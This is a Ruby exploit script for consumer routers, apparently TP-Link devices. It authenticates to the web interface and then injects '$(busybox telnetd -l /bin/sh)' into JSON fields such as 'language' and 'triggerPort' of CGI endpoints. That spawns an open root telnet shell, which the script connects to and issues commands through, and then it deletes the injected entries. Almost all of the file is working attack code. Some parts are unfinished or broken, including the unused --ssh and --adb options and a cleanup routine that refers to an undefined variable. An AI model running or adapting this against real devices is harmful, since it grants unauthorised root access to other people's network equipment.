#!env ruby
require 'bundler'
Bundler.require

require 'json'
require 'openssl'
class TPown 
    attr_accessor :options

    def initialize
        @options = {}
    end

    def payload_v1
        payload_data = {

            token: @options[:token],
            module: "webServer",
            action: 1,
            language: "$(busybox telnetd -l /bin/sh)"
        }.to_json
        payload_del = {

            token: @options[:token],
            module: "webServer",
            action: 1,
            language: "en"
        }.to_json


        res = Curl.post("http://#{@options[:target]}/cgi-bin/qcmap_web_cgi", payload_data) do |http|
            http.headers["Content-Type"] = "application/json"
        end
        p res.body
       
        cleanup_v1
    
    end

    def cleanup_v1
        res = Curl.post("http://#{@options[:target]}/cgi-bin/qcmap_web_cgi", payload_del) do |http|
            http.headers["Content-Type"] = "application/json"
        end
        p res.body
    end


    def payload_v5
        payload_data = {
            "token": @options[:token],
            "module": "portTrigger",
            "action": 1,
            "entryId": 1,
            "enableState": 1,
            "applicationName": "telnetd",
            "triggerPort": "$(busybox telnetd -l /bin/sh)",
            "triggerProtocol": "TCP",
            "openPort": "1337-2137",
            "openProtocol": "TCP"
        }.to_json

        

        res = Curl.post("http://#{@options[:target]}/cgi-bin/web_cgi", payload_data) do |http|
            http.headers["Content-Type"] = "application/json"
        end
        data = JSON.parse(res.body)
        if data["result"] != 0
            raise "Error setting up payload?"
        end

        puts "[ok] Sent telnetd payload"


        

    end

    def cleanup_v5
        payload_del = {
            "token": @options[:token],
            "module": "portTrigger",
            "action": 2,
            "entryIdSet": [1]
        }.to_json

        res = Curl.post("http://#{@options[:target]}/cgi-bin/web_cgi", payload_del) do |http|
            http.headers["Content-Type"] = "application/json"
        end
        data = JSON.parse(res.body)
        if data["result"] != 0
            puts "Error deleting payload - may be safe to ignore"
        else 
            puts "[ok] Deleted payload"
        end

    end

    def connect_telnet()
        puts "Connecting to telnetd"
        @client = Net::Telnet::new("Host" => @options[:target], "Prompt" => /\/ # \z/n, "Timeout" => 10, "Telnetmode" => true, "Waittime" => 0.3)
        
    end

    def cmd(c)
        connect_telnet if @client.nil? 
        data = ""
        @client.cmd(c) do |c|
            data += c
        end

        return data
    end


    def login()

        login_data = {"module": "authenticator", "action": 0}.to_json
        res = Curl.post("http://#{@options[:target]}/cgi-bin/auth_cgi", login_data) do |http|
            http.headers["Content-Type"] = "application/json"
        end

        data = JSON.parse(res.body)
 

        
        nonce = data["nonce"].to_s

        digest = ::OpenSSL::Digest::MD5.hexdigest(@options[:pass] + ":" + nonce)

        login_data = {"module": "authenticator", "action": 1, "digest": digest}.to_json

        res = Curl.post("http://#{@options[:target]}/cgi-bin/auth_cgi", login_data) do |http|
            http.headers["Content-Type"] = "application/json"
        end
        data = JSON.parse(res.body)
        if data["authedIP"].nil? or data["authedIP"].to_s == ""
            raise("Wrong password?")
        end

        puts "[ok] Logged in from #{data["authedIP"]}"
        @options[:source] = data["authedIP"].to_s
        @options[:token] = data["token"]
        return true

    end


    def start_server

    end


end


tp = TPown.new

OptionParser.new do |opts|
  opts.banner = "Usage: tp.rb [options]"

  opts.on("--ssh", "Install SSH server") do |v|
    tp.options[:ssh] = v
  end

  opts.on("--adb", "Enable ADBD") do |v|
    tp.options[:adb] = v
  end

  opts.on("--pass [PASSWORD]", "Web password") do |v|
    tp.options[:pass] = v
  end

  opts.on("-t", "--target [TARGET]", "Target IP") do |v|
    tp.options[:target] = v
  end

  opts.on("-5", "Router v5") do |v|
    tp.options[:version] = 5
  end

end.parse!

tp.login()

if tp.options[:version] == 5
    tp.payload_v5()
    tp.cleanup_v5()

end
puts tp.cmd("ls")
